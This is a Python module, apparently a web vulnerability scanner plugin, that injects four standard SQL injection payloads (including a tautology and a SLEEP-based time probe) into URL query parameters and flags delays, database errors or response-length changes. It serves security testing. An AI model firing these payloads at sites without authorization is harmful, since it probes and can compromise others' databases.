from urllib.parse import urlparse, parse_qs, urlencode
import time

SQLI_PAYLOADS = [
    "'",
    "'--",
    "' OR '1'='1",
    "' AND SLEEP(5)--"
]

FILE_PARAMS = ["file", "path", "img", "image", "download"]


def run(url, ctx, base_resp):
    results = []

    if not base_resp:
        return results

    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    for param in qs:
        # ❌ file-handling params pe SQLi mat lagao
        if param.lower() in FILE_PARAMS:
            continue

        base_len = len(base_resp.text)
        base_time = base_resp.elapsed.total_seconds()

        for payload in SQLI_PAYLOADS:
            q = qs.copy()
            q[param] = payload

            test_url = parsed._replace(
                query=urlencode(q, doseq=True)
            ).geturl()

            start = time.time()
            r = ctx.get(test_url)
            end = time.time()

            if not r:
                continue

            body = r.text.lower()

            # ❌ fopen / file warning → SQLi nahi
            if "failed to open stream" in body or "fopen(" in body:
                continue

            # ✅ time-based
            if end - start >= 4:
                results.append({
                    "type": "SQL Injection",
                    "confidence": "HIGH",
                    "severity": "High",
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "reason": "Time delay detected",

                    "verify": f'curl "{test_url}"'
                })
                break

            # ✅ error-based
            if any(e in body for e in [
                "sql syntax",
                "mysql",
                "syntax error",
                "unclosed quotation mark"
            ]):
                results.append({
                    "type": "SQL Injection",
                    "confidence": "HIGH",
                    "severity": "High",
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "reason": "Database error message detected",

                    "verify": f'curl "{test_url}"'
                })
                break

            # ✅ response deviation
            if abs(len(r.text) - base_len) > 200:
                results.append({
                    "type": "SQL Injection",
                    "confidence": "POSSIBLE",
                    "severity": "Medium",
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "reason": "Response length deviation",

                    "verify": f'curl "{test_url}"'
                })
                break

    return results

